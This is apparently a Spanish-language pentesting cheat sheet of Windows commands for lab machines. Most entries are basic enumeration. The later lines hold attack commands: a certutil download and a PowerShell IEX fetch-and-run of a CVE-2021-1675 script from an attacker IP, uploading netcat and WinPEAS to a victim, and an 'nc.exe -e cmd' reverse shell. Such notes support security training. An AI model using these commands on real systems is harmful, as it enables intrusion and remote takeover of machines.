# Comandos Windows ❮❯

Tags: #Windows #Comandos

```bash
C:\Windows\Temp                              # Directorios con capacidad de escritura en Windows
```


```bash
❯ cls                                        # Nos ayuda a limpiar la pantalla
```

```bash
❯ ipconfig                                   # Nos muestra las interfaces y las direcciones IP
```

```bash
❯ whoami                                     # Miramos el nombre del usuario
```

```bash
❯ net user                                   # Miramos todos los usuarios existentes y sus grupos
❯ net user <User>                            # Miramos el grupo de un usuario especifico
```

```bash
❯ dir                                        # Listamos el contenido del directorio
❯ dir /r /s ❮File.txt❯                       # Buscamos de forma recursiva el string .txt
```

```bash
❯ type ❮File❯                                # Nos muestra el contenido del archivo
```

```bash
❯ upload /home/omar/Documet/HTB/nc.exe       # Subimos el archivo Netcat a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
❯ upload /home/omar/Downloads/Firefox/winpeasx64.exe # Subimos el archivo WinPEAS a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
❯ certutil.exe -f -urlcache -split http://<IP>/winPeas.exe winPeas.exe           # Subimos el archivo WinPEAS a la maquina victima con la IP de atacante
❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
```

```bash
❯ copy \❮IP❯\\smbFolder\\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
```

❯ **nc.exe -e cmd ❮IP Atacante❯ ❮Port❯** Para ejecutar el netcat y nos haga una ReverShell a nuestra IP y puerto especifico
❯ **netstat -nat** Miramos los puertos abiertos
❯ **services** Para ver los servicios que estan corriendo en Windows 

